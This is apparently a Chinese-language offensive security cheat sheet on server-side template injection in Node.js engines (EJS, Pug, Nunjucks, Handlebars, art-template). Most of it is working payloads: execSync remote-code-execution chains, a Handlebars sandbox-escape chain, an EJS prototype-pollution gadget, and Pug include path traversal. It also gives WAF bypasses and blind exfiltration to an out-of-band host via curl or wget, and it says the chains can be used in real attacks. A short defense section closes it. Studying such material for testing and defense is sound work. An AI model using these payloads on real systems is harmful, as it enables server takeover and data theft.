# Node.js 模板注入（SSTI）

## 一句话理解
用户输入进入 Node.js 模板引擎（EJS / Pug / Nunjucks / Handlebars / art-template）渲染，被解析为模板语法执行 JS 代码，危害从 XSS 直接升级到 RCE——因为 Node 下的模板引擎大多最终把模板编译为 JS 函数，且默认没有独立沙箱。

> 本篇 payload 已在 ejs 3.1.10 / pug 3.0.4 / nunjucks 3.2.4 / handlebars 4.7.9 / art-template 4.13.4 本地实测验证，版本差异处单独标注。

## 常见成因
- 把用户输入直接当作模板源码：`res.render(userInput)`、`nunjucks.renderString(req.query.tpl)`、`handlebars.compile(req.body.email)`
- 字符串渲染接口处理不可信内容（renderString / compile / render 的第一个参数用户可控）
- 后台自定义模板、邮件模板、报表导出、主题编辑缺少权限边界
- `res.render('view', req.body)` 把整个请求对象当 locals，导致模板变量全可控
- 误以为「HTML 转义」能防住模板注入（转义防的是 XSS，防不了语法解析层）
- 原型链污染 + 模板引擎 gadget 组合触发（详见 ../exp/EXP-nodejs-proto.md）

## 常见危害
- XSS：突破输出转义（`<%- %>`、`{{@value}}`、autoescape 配置不当）
- 任意文件读取：Pug `include`、命令拼接 `execSync('cat /flag')`
- 敏感信息泄露：`process.env`、模板上下文对象、配置对象
- RCE：`process.mainModule.require('child_process').execSync(...)` 直接命令执行
- 横向组合：配合原型链污染绕过直接注入被过滤的场景

## 通用探针与引擎指纹
先发算术探针，按响应区分引擎：

```text
{{7*7}}       # 双花括号家族（Nunjucks；Jinja2/Twig 同形，注意区分）
<%= 7*7 %>    # EJS（ERB 同形）
#{7*7}        # Pug
```

指纹关键点（`7*'7'` 的类型转换差异）：

| 探针 | Nunjucks | Jinja2(Python) | Twig(PHP) | Handlebars |
|---|---|---|---|---|
| `{{7*7}}` | 49 | 49 | 49 | **Parse error** |
| `{{7*'7'}}` | **49**（JS 数字乘法语义） | 7777777（字符串重复） | 49 | **Parse error** |

- 输出 `49` 而非 `7777777` → 大概率 Node.js（Nunjucks），再结合 `X-Powered-By: Express` 确认
- Handlebars 是 logic-less 模板，不支持算术表达式，`{{7*7}}` 直接编译报错——**报错信息本身就是指纹**（实测 4.1.2~4.7.9 一致）：

```text
Error: Parse error on line 1:
{{7*7}}
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
```

## EJS
### 1. 基础判断
```text
<%= 7*7 %>    # 输出 49 即存在模板求值
```

### 2. RCE
EJS 编译产物运行在 Node 模块作用域，`process`/`global` 天然可达（实测）：

```text
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
<%= process.mainModule.require('child_process').execSync('cat /flag').toString() %>
```

加 `global.` 前缀更稳，可防 locals 中同名变量遮蔽。

### 3. `<%= %>` 与 `<%- %>` 输出差异
- `<%= value %>`：HTML 转义输出（`<b>` → `&lt;b&gt;`）
- `<%- value %>`：**原样输出，不转义**——SSTI 场景下若只能走到输出层，`<%- %>` 是 XSS 的直接入口；两者对 RCE payload 求值无影响，仅影响回显形式

```text
<%= '<img src=x onerror=alert(1)>' %>    # 转义，输出实体
<%- '<img src=x onerror=alert(1)>' %>    # 原样，XSS 生效
```

### 4. 原型链污染联动 RCE（CVE-2022-29078）
应用存在原型链污染时，即使拿不到模板注入入口，也可污染 EJS 的 options 键触发 RCE（gadget 全景见 ../exp/EXP-nodejs-proto.md）：

```json
{"__proto__":{"outputFunctionName":"a; return global.process.mainModule.constructor._load('child_process').execSync('id').toString(); //"}}
```

原理：EJS 编译时把 `options.outputFunctionName` 拼进渲染函数源码前缀（`var <值> = __append;`），`a;` 闭合声明 → `return` 执行命令 → `//` 吞残尾。污染后访问任意走 EJS 编译的页面即触发（模板已编译缓存时换一个未渲染过的路由）。

**版本口径（实测）**：
- ≤ 3.1.6：gadget 有效（3.1.6 实测 RCE 成功）
- ≥ 3.1.7：已修复——options 改用 null 原型对象（污染键读取不到）、`outputFunctionName`/`localsName` 强制 JS 标识符白名单校验（非法值直接抛 `outputFunctionName is not a valid JS identifier`）、locals 默认无原型浅拷贝（`unsafePrototypeLocals` 需显式开启才保留原型链）

### 5. options 污染与 locals（data）注入
- **data 整对象作为 locals**：`res.render('index', req.body)` 会把 body 的所有键合并进模板上下文——攻击者可覆盖任意模板变量（`isAdmin`、`role`、`user` 对象等），从 RCE 降级为逻辑绕过，但利用门槛更低，审计时同样高危
- **原型污染注入变量**：Express 旧版 `res.render` 合并 locals 用 `for...in` 遍历，污染 `Object.prototype` 的键会混进每个模板的上下文，形成全局模板变量注入
- 渲染 options 的其他历史 gadget 键：`escapeFunction`、`localsName`、`client`（3.1.7+ 上述防护后基本失效，旧版本仍可组合利用）

## Pug (Jade)
### 1. 基础判断
```text
#{7*7}    # 输出 49（p= 7*7 等价）
```

注意：`#{7*7}` 单独成行时 Pug 把它当标签插值，渲染成 `<49></49>`——看到这个形状别以为没执行，49 已证明求值。更直观的探针：`p #{7*7}` → `<p>49</p>`。

### 2. RCE
Pug 插值表达式中 `process`/`global` 直接可达（实测）：

```text
p #{global.process.mainModule.require('child_process').execSync('id').toString()}
```

### 3. 缩进块语法：注入完整 webshell 模板
Pug 的 `- ` 前缀是 unbuffered code，可执行任意 JS 不回显；配合插值输出即成完整命令执行模板（实测）：

```text
- var x = global.process.mainModule.require
#{x('child_process').execSync('id').toString()}
```

如果整块模板可控（后台模板编辑场景），可写更完整的 Pug 语法 webshell：`each` 循环、`if` 分支、`- var` 定义变量再输出，等价于直接写 JS。

### 4. include 文件读取（一句话）
Pug 支持本地文件 include，可直接读文件（前提：绝对路径需 `basedir`，相对路径需 `filename` 选项；二者在 Express 视图渲染下通常都已配置）：

```text
include /flag                          # 解析为 path.join(basedir, '/flag')
include /../../../etc/passwd           # join 规范化 ../，可从 basedir 穿越到根（实测）
include ../../../../etc/passwd         # 相对模板文件位置穿越
```

`include` 的文件若以 `.pug` 结尾会被当模板二次编译执行；其他后缀按原文本插入，直接回显文件内容。

## Nunjucks
### 1. 基础判断
```text
{{7*7}}      # 输出 49
{{7*'7'}}    # 输出 49（区别于 Jinja2 的 7777777，用于指纹区分）
```

`autoescape` 只做 HTML 转义，不是沙箱；模板上下文中 `global`/`process` 不可直达（实测输出为空），但内置全局函数对象可达——这就是逃逸入口。

### 2. RCE（range.constructor 链）
`range` 是 Nunjucks 注入上下文的全局函数，取其 `constructor` 即 `Function` 构造器，构造任意函数体执行（HTB Nunchucks 实战同款）：

```text
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

等价入口（均实测可用）：

```text
{{cycler.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
{{constructor.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
```

- `cycler`/`joiner`/`namespace`：Nunjucks 内置全局对象，套路相同
- `constructor.constructor`：裸 `constructor` 沿上下文原型链取到 `Object.prototype.constructor`（即 `Function`），不依赖内置全局， locals 里有任意对象时也成立

### 3. 沙箱逃逸历史
Nunjucks 2.x / 3.x 从未提供真正的模板沙箱，官方长期将「模板可触达 `constructor`」视为 by design（模板作者可信模型），相关讨论持续存在于其 GitHub issue；因此 `range.constructor` 链至今在最新版有效（3.2.4 实测），出题与实战可直接使用。

## Handlebars
### 1. 基础判断
Handlebars 是 logic-less 模板，**不支持算术表达式**，探针走报错指纹（见前文指纹表）：`{{7*7}}` → `Parse error ... got 'INVALID'`。确认解析行为可用：

```text
{{this}}                          # 回显上下文对象
{{#with "s" as |string|}}...{{/with}}    # with 块语法被解析
```

### 2. 引擎机制（逃逸链的基石，实测确认）
Handlebars 编译产物运行在 `new Function` 中，`require`/`process` 不在作用域，但**逃逸后可经 `global` 拿回一切**。链的构造依赖四个机制：
1. mustache 对解析为函数的路径会**自动调用**（`{{string.sub "x"}}` → 调用 `String.prototype.sub("x")`）
2. `{{#with X}}` 中 X 为函数时会**先调用再切换上下文**（`{{#with split}}` → `split.call(上下文)` → 得到数组，this 变成数组）
3. 带参数的 mustache / 子表达式调用时 `this` 绑定为当前数据上下文（depth0）
4. `lookup` helper 取任意属性（`constructor` 不可枚举时有检查，见版本线）

### 3. 经典沙箱逃逸链（CVE-2019-19920 场景）
HTB Bike 实战链（handlebars 4.x，出处见 Reference），本质是「数组当堆栈存入 Function 构造器与代码字符串，最后 `apply` 一次完成构造+调用」：

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return global.process.mainModule.require('child_process').execSync('whoami').toString()"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

要点：
- `string.sub.constructor` 即 `Function` 构造器（`String.prototype.sub` 是函数，函数的 constructor 是 Function）
- 最终等价于 `new Function("return global.process.mainModule.require('child_process').execSync('whoami').toString()")()`，经 `global` 拿回 `require`
- **版本敏感**：该链在 4.5.3 / 3.0.8 修复（CVE-2019-19920，lookup helper 校验缺陷）；4.6.0 起 runtimeOptions 默认拒绝解析原型链属性（实测 4.7.9 报 `Access has been denied to resolve the property "split"`，即使应用开启 `allowProtoPropertiesByDefault/allowProtoMethodsByDefault`，链仍需按版本微调 this 绑定），实战先确认目标 handlebars 精确版本

### 4. 版本时间线
- CVE-2019-19919（< 4.3.0）：模板可污染 `__proto__`/`__defineGetter__` 导致原型污染 → RCE
- CVE-2019-19920（< 3.0.8 / < 4.5.3）：lookup helper 任意代码执行（上文链）
- CVE-2021-23369 / CVE-2021-23383（< 4.7.7）：特定编译选项下 RCE / 原型污染，修复版本 4.7.7
- 4.6.0+：runtimeOptions 默认拦截原型属性/方法访问（前提是应用不去主动放开）

## art-template（国产引擎，简要）
标准语法 `{{ }}` 内是 JS 表达式，`{{each}}`/`{{if}}`/`{{set}}` 为语句；RCE 前提同样是用户输入进入 `template.compile()/render()`（标准语法 `{{value}}` 转义输出，`{{@value}}` 原文输出）。

**机制陷阱（实测）**：art-template 编译时会把模板里用到的用户标识符绑定到 locals 局部变量（生成 `var process=$data.process`），直接写 `{{process.mainModule...}}` 会因 `process` 为 undefined 报错——需用引擎注入的 `$escape`（真实函数）或 locals 对象走 constructor 链：

```text
{{7*7}}    # 探针，输出 49
{{$escape.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
{{user.constructor.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
```

一句话：`$escape` 来自 `$imports`（编译器注入、不被遮蔽），其 constructor 即 Function；locals 中有任意对象（如 `user`）时 `constructor.constructor` 同样直达。

## 实战排查思路
### 1. 白盒审计关键词
定位渲染调用点，回溯**第一个参数**（模板源码）是否用户可控：

```text
res.render(            # Express：res.render(userInput) / res.render('view', req.body)
ejs.render( / ejs.renderFile(
pug.render( / pug.compile(
nunjucks.renderString( / njk.renderString(
handlebars.compile( / hbs.compile(
template.compile( / art.render(     # art-template
```

重点场景：后台模板编辑、邮件模板预览、导出报表、CMS 页面片段、自定义主题。

### 2. 黑盒判断
- 模板语法**原样回显** → 没进解析层（普通输出，不是 SSTI）
- 回显 `49` → 表达式被执行（`<%= %>`/`{{}}`/`#{}` 按引擎对应）
- 回显 **Parse error**（Expecting ... got 'INVALID'）→ Handlebars 特征，报错栈还会泄露路径与版本
- 报 500 / 空白 → 可能被 WAF 或语法错误拦，换变体重测（`${7*7}`、`{{7*"7"}}`）
- 确认引擎后按本文各引擎 RCE 链逐级尝试：先信息泄露（`process.env`），再命令执行

### 3. 盲注
无回显时：时间盲注（命令换 `sleep 5`）与 OOB（`curl/wget http://oast/` 或 DNS 外带）结合，Nunjucks/EJS 链都适用。

## 常见绕过思路
- **上下文遮蔽绕过**：art-template 把 `process` 绑成局部变量 → 改用 `$escape.constructor`；EJS 的 process 被 locals 遮蔽 → 加 `global.` 前缀
- **转义干扰**：命令输出记得 `.toString()`；Nunjucks autoescape 下 HTML 实体不影响 49 类指纹
- **定界符被过滤**：EJS 支持自定义 delimiter（应用配置 `<?` 等替代 `<%`），审计时注意非默认定界符；Nunjucks 可试 `{%print(7*7)%}` 语句形态
- **WAF**：`{{` URL 编码（`%7B%7B`）或双重编码；payload 拆分（Pug `- var` 定义 + 插值输出两段式）
- **直接注入被过滤 → 走原型链污染**：污染 EJS `outputFunctionName`、Pug `block` 等 gadget 间接达成 RCE（见 ../exp/EXP-nodejs-proto.md），且 `constructor.prototype` 形式可绕过只拉黑 `__proto__` 的过滤
- **Handlebars 新版拦截 → 利用应用配置**：目标若为兼容旧模板开启了 `allowProtoPropertiesByDefault`，4.6+ 的拦截即失效

## 防御要点
### 1. 数据与模板分离（根本）
用户输入只能作为**变量值**传入模板，绝不进入模板源码层；`render` 的第一个参数必须是受控的静态模板名/字符串。
### 2. 变量白名单
`res.render('view', data)` 前只挑选白名单字段构造 data，禁止整包 `req.body`/`req.query` 传入。
### 3. 升级引擎版本
- EJS ≥ 3.1.7（堵 outputFunctionName 等 gadget，且不要开启 `unsafePrototypeLocals`）
- Handlebars ≥ 4.7.7，且不开启 `allowProtoPropertiesByDefault/allowProtoMethodsByDefault`
- 同时治理上游原型链污染（merge/extend 过滤 `__proto__`、`constructor`、`prototype`）
### 4. 模板编辑能力隔离
后台模板/邮件模板/主题编辑仅限极少数可信角色，保存与渲染分离审计。
### 5. 输出转义兜底
默认转义输出（`<%= %>`/`{{}}`/`{{value}}`），`<%- %>`/`{{@value}}`/`p!=` 类原样输出点逐一评审，防 SSTI 失效后跌落为存储型 XSS。

## 速查清单
- 先用 `{{7*7}}` / `<%= 7*7 %>` / `#{7*7}` 三连探针定引擎；`{{7*'7'}}`=49 且 `X-Powered-By: Express` → Nunjucks
- Handlebars 特征：`{{7*7}}` Parse error，报错信息即指纹
- RCE 万能落点：`global.process.mainModule.require('child_process').execSync('id')`
- EJS/Pug：process 直达；Nunjucks：range.constructor；art-template：$escape.constructor；Handlebars：Function 构造器逃逸链
- 审计只看一件事：render/compile 的第一个参数是否拼了用户输入
- 原型污染拿不到模板注入时，反过来想 gadget（EJS outputFunctionName ≤3.1.6、Pug block）
- 别把 SSTI 与 XSS 混淆：`<>` 生效是 XSS，`{{}}` 内表达式求值才是 SSTI

## Reference
- [HackTricks — SSTI（含 Node.js 各引擎 payload）](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)
- [PayloadsAllTheThings — Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [HTB Bike — Handlebars SSTI→RCE writeup（完整逃逸链出处）](https://gist.github.com/TechnoHacks181/f65a689f72c3b2c1a6388201b5cc6ab3)
- [EJS CVE-2022-29078（outputFunctionName gadget）](https://github.com/advisories/GHSA-phwq-j96p-4h7m)
- [Handlebars runtime options（4.6+ 原型访问控制）](https://handlebarsjs.com/api-reference/runtime-options.html)
- [nunjucks — GitHub（沙箱与 constructor 可达性相关 issue）](https://github.com/mozilla/nunjucks/issues)
- 本仓库交叉引用：../exp/EXP-nodejs-proto.md（原型链污染 → EJS/Pug gadget RCE）、../exp/EXP-SSTI-ALL.md、../exp/EXP-SSTI-PHP.md、../exp/EXP-SSTI-Python.md
